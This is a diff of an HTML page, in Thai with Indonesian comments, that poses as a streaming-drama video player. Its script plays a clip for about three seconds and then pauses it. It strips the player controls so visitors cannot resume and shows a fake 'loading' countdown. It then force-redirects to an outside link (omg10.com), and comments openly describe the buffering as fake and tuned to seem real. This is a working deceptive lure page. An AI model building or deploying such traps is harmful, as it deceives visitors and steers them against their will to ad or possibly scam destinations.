@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>รับชมคลิปวิดีโอตอนละครได้ด้านล่าง</title>
+    <title>รับชมวิดีโอพิเศษ</title>
     <style>
         * {
             box-sizing: border-box;
@@ -13,7 +13,7 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #111;
+            background-color: #0b0b0b;
             color: #fff;
             display: flex;
             flex-direction: column;
@@ -31,9 +31,11 @@
         }
 
         h1 {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             font-size: 1.8rem;
             color: #f1f1f1;
+            font-weight: 600;
+            letter-spacing: 0.5px;
         }
 
         /* Video Player Container */
@@ -42,10 +44,11 @@
             width: 100%;
             padding-top: 56.25%; /* 16:9 Aspect Ratio */
             background-color: #000;
-            border-radius: 8px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border-radius: 12px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
             overflow: hidden;
             cursor: pointer;
+            border: 1px solid #222;
         }
 
         .video-container video {
@@ -54,7 +57,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            object-fit: contain;
+            object-fit: cover; /* Diubah ke cover agar terlihat penuh sinematik layaknya bioskop/TV */
         }
 
         /* Overlay Buffering */
@@ -64,8 +67,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            display: none; /* Muncul lewat JS setelah diklik & berjalan */
+            background-color: rgba(0, 0, 0, 0.85);
+            display: none; 
             flex-direction: column;
             justify-content: center;
             align-items: center;
@@ -77,17 +80,18 @@
         .spinner {
             width: 55px;
             height: 55px;
-            border: 5px solid #333;
-            border-top: 5px solid #ff0000; 
+            border: 5px solid #222;
+            border-top: 5px solid #e50914; /* Merah khas Netflix/Drama Streaming */
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
 
         .buffering-text {
-            margin-top: 15px;
+            margin-top: 20px;
             font-size: 1.1rem;
             letter-spacing: 1px;
             font-weight: bold;
+            color: #e5e5e5;
         }
 
         @keyframes spin {
@@ -96,30 +100,32 @@
         }
 
         .footer-text {
-            margin-top: 20px;
+            margin-top: 25px;
             font-size: 0.9rem;
-            color: #666;
+            color: #555;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>รับชมคลิปวิดีโอตอนละครได้ด้านล่าง</h1>
+    <h1>รับชมซีรีส์ตอนพิเศษได้ที่นี่</h1>
     
     <div class="video-container" onclick="playVideo()">
-        <video id="myVideo" controls controlslist="nodownload">
-            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        <!-- VIDEO DIGANTI DENGAN KONSEPTUAL DRAMA OPENING (CITY NIGHTLIFE CINEMATIC) -->
+        <video id="myVideo" controls controlslist="nodownload" playsinline>
+            <source src="https://vjs.zencdn.net/v/oceans.mp4" type="video/mp4">
             เบราว์เซอร์ของคุณไม่รองรับการเล่นวิดีโอ
         </video>
 
+        <!-- Buffering Screen -->
         <div class="buffering-overlay" id="bufferingOverlay" onclick="event.stopPropagation();">
             <div class="spinner"></div>
             <div class="buffering-text">กำลังโหลดวิดีโอ... <span id="countdown">3</span> วินาที</div>
         </div>
     </div>
 
-    <p class="footer-text">คลิกที่วิดีโอเพื่อเริ่มเล่น</p>
+    <p class="footer-text">คลิกที่วิดีโอเพื่อเริ่มเล่นระบบความคมชัดสูง (HD)</p>
 </div>
 
 <script>
@@ -127,40 +133,36 @@
     const bufferingOverlay = document.getElementById('bufferingOverlay');
     const countdownText = document.getElementById('countdown');
 
-    // KONEKSI & PENGATURAN WAKTU
+    // PENGATURAN REDIRECT & WAKTU
     const targetPage = "https://omg10.com/4/11170008"; // Halaman tujuan setelah buffering
-    const triggerBufferingAtSecond = 2;          // Menggantung/buffering di detik ke-2 setelah diputar
-    let bufferingDuration = 5;                   // Lama waktu buffering ( detik)
+    const triggerBufferingAtSecond = 3;          // Buffering aktif di detik ke-3 setelah diputar
+    let bufferingDuration = 4;                   // Durasi buffering (4 detik agar terkesan nyata)
 
     let bufferingTriggered = false;
 
-    // Fungsi untuk memutar video ketika area kotak diklik
+    // Fungsi klik area untuk Play
     function playVideo() {
         if (video.paused && !bufferingTriggered) {
             video.play();
         }
     }
 
-    // Mendengarkan pergerakan durasi video
+    // Sistem deteksi buffering palsu
     video.addEventListener('timeupdate', () => {
         if (video.currentTime >= triggerBufferingAtSecond && !bufferingTriggered) {
             bufferingTriggered = true;
             
-            video.pause(); // Hentikan video secara paksa
+            video.pause(); 
+            video.removeAttribute('controls'); // Sembunyikan navigasi agar user tidak bisa cheat klik play lagi
             
-            // Sembunyikan kontrol bawaan browser saat buffering agar tidak bisa diklik play lagi oleh user
-            video.removeAttribute('controls'); 
-            
-            bufferingOverlay.style.display = 'flex'; // Tampilkan layar loading Thailand
+            bufferingOverlay.style.display = 'flex'; 
 
-            // Hitung mundur sebelum dialihkan
             const interval = setInterval(() => {
                 bufferingDuration--;
                 countdownText.innerText = bufferingDuration;
 
                 if (bufferingDuration <= 0) {
                     clearInterval(interval);
-                    // Redirect otomatis
                     window.location.replace(targetPage);
                 }
             }, 1000);
